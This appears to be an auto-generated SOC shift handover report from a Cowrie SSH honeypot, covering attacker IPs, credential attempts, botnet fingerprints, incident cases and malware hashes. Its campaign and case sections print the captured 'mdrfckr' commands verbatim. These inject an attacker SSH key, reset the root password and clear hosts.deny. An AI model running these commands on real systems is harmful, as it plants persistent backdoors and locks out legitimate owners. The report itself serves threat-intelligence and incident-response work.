# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-02 |
| **Generated At** | 2026-04-02T18:54:55Z |
| **Shift Time** | 18:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **44** |
| Confirmed Threats | **36** |
| False Positives Filtered | **8** (18.2%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **15** |
| High Severity Cases | **5** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **39** |
| Malware Samples Analyzed | **0** HIGH · **15** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **27** |
| Unique Credential Pairs | **24** |
| Unique Usernames | **18** |
| Unique Passwords | **24** |
| Successful Auth Pairs | **5** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 5 |
| `pi` | 2 |
| `GET / HTTP/1.1` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | 2 |
| `Accept-Encoding: gzip` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `Host: 13.235.92.17:23` | 2 |
| `Accept: */*` | 2 |
| `` | 2 |
| `support2010` | 1 |
| `raspberryraspberry993311` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 2 |
| `User-Agent: visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36` | `Accept: */*` | 2 |
| `Accept-Encoding: gzip` | `` | 2 |
| `support` | `support2010` | 1 |
| `pi` | `raspberryraspberry993311` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root44` | `85.152.57.60` | 2026-04-02T17:35:56 |
| `root` | `asd456789` | `140.246.137.102` | 2026-04-02T17:59:22 |
| `root` | `waheguru` | `219.92.11.49` | 2026-04-02T18:45:17 |
| `root` | `3245gs5662d34` | `219.92.11.49` | 2026-04-02T18:45:20 |
| `root` | `milan123` | `49.247.36.49` | 2026-04-02T18:52:49 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **44** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 17 |
| libssh | 8 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 15 | 14 |
| `03a80b21afa8...` | Modern SSH client | 8 | 4 |
| `ec7378c1a92f...` | Generic scanner | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 15 | 14 | Mirai/variant |
| `03a80b21afa8...` | libssh | 8 | 4 | Modern SSH client |
| `ec7378c1a92f...` | OpenSSH | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:S16wb2K374J9"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `140.246.137.102`, `49.247.36.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `219.92.11.49`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **26** |
| High-Risk ASNs | **20** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS2516` | KDDI CORPORATION | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS22773` | Cox Communications Inc. | 1 | MEDIUM |
| `AS45557` | Vietnam Technology and Telecommunication JSC | 1 | LOW |
| `AS24560` | Bharti Airtel Ltd., Telemedia Services | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (5)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-9c954168bfcf

| Field | Detail |
|---|---|
| **Source IP** | `85.152.57[.]60` |
| **First Seen** | 2026-04-02 17:35 |
| **Last Seen** | 2026-04-02 17:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 17:35:54` | `cowrie.session.connect` |
| `2026-04-02 17:35:55` | `cowrie.client.version` |
| `2026-04-02 17:35:55` | `cowrie.client.kex` |
| `2026-04-02 17:35:56` | `cowrie.login.success` |
| `2026-04-02 17:35:56` | `cowrie.direct-tcpip.request` |
| `2026-04-02 17:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.152.57[.]60` to AbuseIPDB if not already reported
- [ ] Block `85.152.57[.]60` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e367963f2b5

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-04-02 17:59 |
| **Last Seen** | 2026-04-02 17:59 |
| **Session Duration** | 27s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:S16wb2K374J9"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 17:59:22` | `cowrie.session.connect` |
| `2026-04-02 17:59:22` | `cowrie.client.version` |
| `2026-04-02 17:59:22` | `cowrie.client.kex` |
| `2026-04-02 17:59:22` | `cowrie.login.success` |
| `2026-04-02 17:59:23` | `cowrie.session.params` |
| `2026-04-02 17:59:23` | `cowrie.command.input` |
| `2026-04-02 17:59:23` | `cowrie.command.failed` |
| `2026-04-02 17:59:23` | `cowrie.log.closed` |
| `2026-04-02 17:59:23` | `cowrie.session.params` |
| `2026-04-02 17:59:23` | `cowrie.command.input` |
| `2026-04-02 17:59:24` | `cowrie.session.file_download` |
| `2026-04-02 17:59:24` | `cowrie.log.closed` |
| `2026-04-02 17:59:40` | `cowrie.session.params` |
| `2026-04-02 17:59:40` | `cowrie.command.input` |
| `2026-04-02 17:59:40` | `cowrie.log.closed` |
| `2026-04-02 17:59:40` | `cowrie.session.params` |
| `2026-04-02 17:59:40` | `cowrie.command.input` |
| `2026-04-02 17:59:41` | `cowrie.log.closed` |
| `2026-04-02 17:59:41` | `cowrie.session.params` |
| `2026-04-02 17:59:41` | `cowrie.command.input` |
| `2026-04-02 17:59:41` | `cowrie.session.file_download` |
| `2026-04-02 17:59:41` | `cowrie.log.closed` |
| `2026-04-02 17:59:42` | `cowrie.session.params` |
| `2026-04-02 17:59:42` | `cowrie.command.input` |
| `2026-04-02 17:59:42` | `cowrie.log.closed` |
| `2026-04-02 17:59:42` | `cowrie.session.params` |
| `2026-04-02 17:59:42` | `cowrie.command.input` |
| `2026-04-02 17:59:42` | `cowrie.log.closed` |
| `2026-04-02 17:59:43` | `cowrie.session.params` |
| `2026-04-02 17:59:43` | `cowrie.command.input` |
| `2026-04-02 17:59:43` | `cowrie.command.input` |
| `2026-04-02 17:59:43` | `cowrie.log.closed` |
| `2026-04-02 17:59:43` | `cowrie.session.params` |
| `2026-04-02 17:59:43` | `cowrie.command.input` |
| `2026-04-02 17:59:43` | `cowrie.log.closed` |
| `2026-04-02 17:59:44` | `cowrie.session.params` |
| `2026-04-02 17:59:44` | `cowrie.command.input` |
| `2026-04-02 17:59:44` | `cowrie.log.closed` |
| `2026-04-02 17:59:44` | `cowrie.session.params` |
| `2026-04-02 17:59:44` | `cowrie.command.input` |
| `2026-04-02 17:59:45` | `cowrie.log.closed` |
| `2026-04-02 17:59:45` | `cowrie.session.params` |
| `2026-04-02 17:59:45` | `cowrie.command.input` |
| `2026-04-02 17:59:45` | `cowrie.log.closed` |
| `2026-04-02 17:59:46` | `cowrie.session.params` |
| `2026-04-02 17:59:46` | `cowrie.command.input` |
| `2026-04-02 17:59:46` | `cowrie.log.closed` |
| `2026-04-02 17:59:46` | `cowrie.session.params` |
| `2026-04-02 17:59:46` | `cowrie.command.input` |
| `2026-04-02 17:59:46` | `cowrie.log.closed` |
| `2026-04-02 17:59:47` | `cowrie.session.params` |
| `2026-04-02 17:59:47` | `cowrie.command.input` |
| `2026-04-02 17:59:47` | `cowrie.log.closed` |
| `2026-04-02 17:59:47` | `cowrie.session.params` |
| `2026-04-02 17:59:47` | `cowrie.command.input` |
| `2026-04-02 17:59:47` | `cowrie.log.closed` |
| `2026-04-02 17:59:48` | `cowrie.session.params` |
| `2026-04-02 17:59:48` | `cowrie.command.input` |
| `2026-04-02 17:59:48` | `cowrie.log.closed` |
| `2026-04-02 17:59:48` | `cowrie.session.params` |
| `2026-04-02 17:59:48` | `cowrie.command.input` |
| `2026-04-02 17:59:49` | `cowrie.log.closed` |
| `2026-04-02 17:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98dab9baafef

| Field | Detail |
|---|---|
| **Source IP** | `219.92.11[.]49` |
| **First Seen** | 2026-04-02 18:45 |
| **Last Seen** | 2026-04-02 18:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 18:45:16` | `cowrie.session.connect` |
| `2026-04-02 18:45:16` | `cowrie.client.version` |
| `2026-04-02 18:45:16` | `cowrie.client.kex` |
| `2026-04-02 18:45:17` | `cowrie.login.success` |
| `2026-04-02 18:45:17` | `cowrie.session.params` |
| `2026-04-02 18:45:17` | `cowrie.command.input` |
| `2026-04-02 18:45:17` | `cowrie.command.failed` |
| `2026-04-02 18:45:17` | `cowrie.log.closed` |
| `2026-04-02 18:45:17` | `cowrie.session.params` |
| `2026-04-02 18:45:17` | `cowrie.command.input` |
| `2026-04-02 18:45:17` | `cowrie.session.file_download` |
| `2026-04-02 18:45:17` | `cowrie.log.closed` |
| `2026-04-02 18:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.92.11[.]49` to AbuseIPDB if not already reported
- [ ] Block `219.92.11[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fca34a2f648

| Field | Detail |
|---|---|
| **Source IP** | `219.92.11[.]49` |
| **First Seen** | 2026-04-02 18:45 |
| **Last Seen** | 2026-04-02 18:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 18:45:20` | `cowrie.session.connect` |
| `2026-04-02 18:45:20` | `cowrie.client.version` |
| `2026-04-02 18:45:20` | `cowrie.client.kex` |
| `2026-04-02 18:45:20` | `cowrie.login.success` |
| `2026-04-02 18:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.92.11[.]49` to AbuseIPDB if not already reported
- [ ] Block `219.92.11[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3122a700d18f

| Field | Detail |
|---|---|
| **Source IP** | `49.247.36[.]49` |
| **First Seen** | 2026-04-02 18:52 |
| **Last Seen** | 2026-04-02 18:53 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:sEDDgOaHIb8e"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 18:52:48` | `cowrie.session.connect` |
| `2026-04-02 18:52:48` | `cowrie.client.version` |
| `2026-04-02 18:52:48` | `cowrie.client.kex` |
| `2026-04-02 18:52:49` | `cowrie.login.success` |
| `2026-04-02 18:52:49` | `cowrie.session.params` |
| `2026-04-02 18:52:49` | `cowrie.command.input` |
| `2026-04-02 18:52:49` | `cowrie.command.failed` |
| `2026-04-02 18:52:49` | `cowrie.log.closed` |
| `2026-04-02 18:52:49` | `cowrie.session.params` |
| `2026-04-02 18:52:49` | `cowrie.command.input` |
| `2026-04-02 18:52:50` | `cowrie.session.file_download` |
| `2026-04-02 18:52:50` | `cowrie.log.closed` |
| `2026-04-02 18:53:06` | `cowrie.session.params` |
| `2026-04-02 18:53:06` | `cowrie.command.input` |
| `2026-04-02 18:53:06` | `cowrie.log.closed` |
| `2026-04-02 18:53:06` | `cowrie.session.params` |
| `2026-04-02 18:53:06` | `cowrie.command.input` |
| `2026-04-02 18:53:06` | `cowrie.log.closed` |
| `2026-04-02 18:53:07` | `cowrie.session.params` |
| `2026-04-02 18:53:07` | `cowrie.command.input` |
| `2026-04-02 18:53:07` | `cowrie.session.file_download` |
| `2026-04-02 18:53:07` | `cowrie.log.closed` |
| `2026-04-02 18:53:07` | `cowrie.session.params` |
| `2026-04-02 18:53:07` | `cowrie.command.input` |
| `2026-04-02 18:53:07` | `cowrie.log.closed` |
| `2026-04-02 18:53:08` | `cowrie.session.params` |
| `2026-04-02 18:53:08` | `cowrie.command.input` |
| `2026-04-02 18:53:08` | `cowrie.log.closed` |
| `2026-04-02 18:53:08` | `cowrie.session.params` |
| `2026-04-02 18:53:08` | `cowrie.command.input` |
| `2026-04-02 18:53:08` | `cowrie.command.input` |
| `2026-04-02 18:53:08` | `cowrie.log.closed` |
| `2026-04-02 18:53:09` | `cowrie.session.params` |
| `2026-04-02 18:53:09` | `cowrie.command.input` |
| `2026-04-02 18:53:09` | `cowrie.log.closed` |
| `2026-04-02 18:53:09` | `cowrie.session.params` |
| `2026-04-02 18:53:09` | `cowrie.command.input` |
| `2026-04-02 18:53:09` | `cowrie.log.closed` |
| `2026-04-02 18:53:09` | `cowrie.session.params` |
| `2026-04-02 18:53:09` | `cowrie.command.input` |
| `2026-04-02 18:53:10` | `cowrie.log.closed` |
| `2026-04-02 18:53:10` | `cowrie.session.params` |
| `2026-04-02 18:53:10` | `cowrie.command.input` |
| `2026-04-02 18:53:10` | `cowrie.log.closed` |
| `2026-04-02 18:53:10` | `cowrie.session.params` |
| `2026-04-02 18:53:10` | `cowrie.command.input` |
| `2026-04-02 18:53:10` | `cowrie.log.closed` |
| `2026-04-02 18:53:11` | `cowrie.session.params` |
| `2026-04-02 18:53:11` | `cowrie.command.input` |
| `2026-04-02 18:53:11` | `cowrie.log.closed` |
| `2026-04-02 18:53:11` | `cowrie.session.params` |
| `2026-04-02 18:53:11` | `cowrie.command.input` |
| `2026-04-02 18:53:11` | `cowrie.log.closed` |
| `2026-04-02 18:53:12` | `cowrie.session.params` |
| `2026-04-02 18:53:12` | `cowrie.command.input` |
| `2026-04-02 18:53:12` | `cowrie.log.closed` |
| `2026-04-02 18:53:12` | `cowrie.session.params` |
| `2026-04-02 18:53:12` | `cowrie.command.input` |
| `2026-04-02 18:53:12` | `cowrie.log.closed` |
| `2026-04-02 18:53:13` | `cowrie.session.params` |
| `2026-04-02 18:53:13` | `cowrie.command.input` |
| `2026-04-02 18:53:13` | `cowrie.log.closed` |
| `2026-04-02 18:53:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.36[.]49` to AbuseIPDB if not already reported
- [ ] Block `49.247.36[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `18.218.118[.]203` | **7** | 2026-04-02 17:44 | 2026-04-02 17:51 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `111.70.39[.]214` | **2** | 2026-04-02 16:56 | 2026-04-02 17:54 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `140.246.137[.]102` | **2** | 2026-04-02 17:59 | 2026-04-02 18:01 | 4m | 0 | `T1592` | 🟢 LOW |
| `95.117.197[.]108` | **2** | 2026-04-02 17:05 | 2026-04-02 17:05 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.220.91[.]138` | 1 | 2026-04-02 18:01 | 2026-04-02 18:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.246.89[.]68` | 1 | 2026-04-02 18:01 | 2026-04-02 18:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `112.132.249[.]164` | 1 | 2026-04-02 18:00 | 2026-04-02 18:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `113.158.205[.]225` | 1 | 2026-04-02 18:49 | 2026-04-02 18:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `116.114.94[.]242` | 1 | 2026-04-02 18:15 | 2026-04-02 18:15 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.175.205[.]9` | 1 | 2026-04-02 18:40 | 2026-04-02 18:40 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.32.34[.]173` | 1 | 2026-04-02 18:37 | 2026-04-02 18:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `122.176.156[.]82` | 1 | 2026-04-02 17:17 | 2026-04-02 17:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.52.205[.]86` | 1 | 2026-04-02 18:20 | 2026-04-02 18:20 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `174.94.236[.]211` | 1 | 2026-04-02 18:53 | 2026-04-02 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.237.33[.]162` | 1 | 2026-04-02 16:59 | 2026-04-02 16:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `219.92.11[.]49` | 1 | 2026-04-02 18:45 | 2026-04-02 18:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.120.4[.]61` | 1 | 2026-04-02 18:15 | 2026-04-02 18:15 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `223.82.86[.]2` | 1 | 2026-04-02 17:22 | 2026-04-02 17:22 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.64.30[.]151` | 1 | 2026-04-02 18:13 | 2026-04-02 18:13 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `61.156.217[.]77` | 1 | 2026-04-02 18:30 | 2026-04-02 18:30 | 2s | 0 | `T1592` | 🟢 LOW |
| `83.239.0[.]202` | 1 | 2026-04-02 18:35 | 2026-04-02 18:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `86.33.164[.]77` | 1 | 2026-04-02 17:54 | 2026-04-02 17:54 | 5s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
